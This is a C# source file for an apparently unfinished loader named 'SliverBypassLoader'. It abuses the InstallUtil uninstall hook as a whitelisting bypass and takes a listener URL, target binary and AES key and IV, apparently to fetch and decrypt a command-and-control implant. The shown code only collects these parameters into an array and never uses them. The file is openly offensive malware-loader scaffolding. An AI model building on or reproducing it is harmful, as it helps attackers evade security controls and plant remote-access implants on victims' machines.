using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Linq;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Management.Automation.Host;
using System.Runtime.Remoting.Contexts;

namespace SliverBypassLoader
{
    class altbypass
    { 
    
    }

    // InstallUtill uninstall bypass
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string listenerUrl = this.Context.Parameters["listenerUrl"];
            string compressAlgorithm = this.Context.Parameters["compressAlgorithm"];
            string targetBinary = this.Context.Parameters["targetBinary"];
            string aesKey = this.Context.Parameters["aesKey"];
            string aesIv = this.Context.Parameters["aesIv"];

            if (listenerUrl == null)
            {
                throw new InstallException("Mandatory parameter 'listenerUrl' is missing");
            }

            if (compressAlgorithm == null)
            {
                compressAlgorithm = "";
            }

            if (targetBinary == null)
            {
                throw new InstallException("Mandatory parameter 'targetBinary' is missing");
            }

            if (aesKey == null)
            {
                throw new InstallException("Mandatory parameter 'aesKey' is missing");
            }

            if (aesIv == null)
            {
                throw new InstallException("Mandatory parameter 'aesIv' is missing");
            }

            string[] args = new string[] { listenerUrl, compressAlgorithm, targetBinary, aesKey, aesIv };
        }
    }
}
